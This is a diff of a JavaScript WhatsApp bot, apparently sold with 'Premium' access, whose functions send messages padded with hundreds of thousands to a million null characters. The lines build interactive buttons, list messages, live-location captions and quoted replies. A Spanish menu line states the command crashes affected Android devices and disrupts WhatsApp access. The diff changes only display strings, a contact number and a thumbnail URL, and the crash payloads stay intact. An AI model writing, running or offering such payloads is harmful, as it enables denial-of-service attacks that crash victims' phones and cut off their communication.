@@ -168,7 +168,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
                 'subtitle': " "
               },
               'body': {
-                'text': "我的主人 ˹Bless˼ 曾在這裡。"
+                'text': "مرحباً، كيف حالك؟"
               },
               'footer': {
                 'text': 'xp'
@@ -176,7 +176,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
               'nativeFlowMessage': {
                 'buttons': [{
                   'name': 'cta_url',
-                  'buttonParamsJson': "{ display_text : '我的主人 ˹Bless˼ 曾在這裡。', url : , merchant_url :  }"
+                  'buttonParamsJson': "{ display_text : 'مرحباً، كيف حالك؟', url : , merchant_url :  }"
                 }],
                 'messageParamsJson': "\0".repeat(1000000)
               }
@@ -196,9 +196,9 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
     async function sendListMessage(jid) {
       var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
         'listMessage': {
-          'title': "我的主人 ˹Bless˼ 曾在這裡。" + "\0".repeat(920000),
-          'footerText': "✅⃟╮",
-          'description': "✅⃟╮",
+          'title': "مرحباً، كيف حالك؟" + "\0".repeat(920000),
+          'footerText': "مرحباً، كيف حالك؟",
+          'description': "مرحباً، كيف حالك؟",
           'buttonText': null,
           'listType': 2,
           'productListInfo': {
@@ -250,7 +250,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
             'liveLocationMessage': {
               'degreesLatitude': 'p',
               'degreesLongitude': 'p',
-              'caption': '我的主人 ˹Bless˼ 曾在這裡。' + '\0'.repeat(50000),
+              'caption': 'مرحباً، كيف حالك؟' + '\0'.repeat(50000),
               'sequenceNumber': '0',
               'jpegThumbnail': ''
             }
@@ -276,7 +276,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
             'stanzaId': jid,
             'participant': jid,
             'quotedMessage': {
-              'conversation': '我的主人 ˹Bless˼ 曾在這裡。' + '\0'.repeat(50000)
+              'conversation': 'مرحباً، كيف حالك؟' + '\0'.repeat(50000)
             },
             'disappearingMode': {
               'initiator': "CHANGED_IN_CHAT",
@@ -507,7 +507,7 @@ ${readmore}
 > Genera un crash en el dispositivo Android afectado, mostrando un mensaje de error del sistema y afectando el acceso a WhatsApp.
 
 ¿Quieres ser Premium? comunícate con el siguiente número.
-*[Click]* +51976254398`;
+*[Click]* +51 976 254 398`;
 
         await JackBot.sendMessage(m.chat, {
           text: premiumCommands,
@@ -516,7 +516,7 @@ ${readmore}
               showAdAttribution: true,
               title: `¿Quieres ser usuario Premium?`,
               body: `Lee la siguiente información :)`,
-              thumbnailUrl: 'https://i.ibb.co/mrKpdXk/preview-1.webp', //https://i.ibb.co/80F70Nm/fonfovip.webp
+              thumbnailUrl: 'https://i.pinimg.com/736x/6e/e4/90/6ee490d70942a9e64746438c75f185d4.jpg', //https://i.ibb.co/80F70Nm/fonfovip.webp
               sourceUrl: global.link,
               mediaType: 1,
               renderLargerThumbnail: true
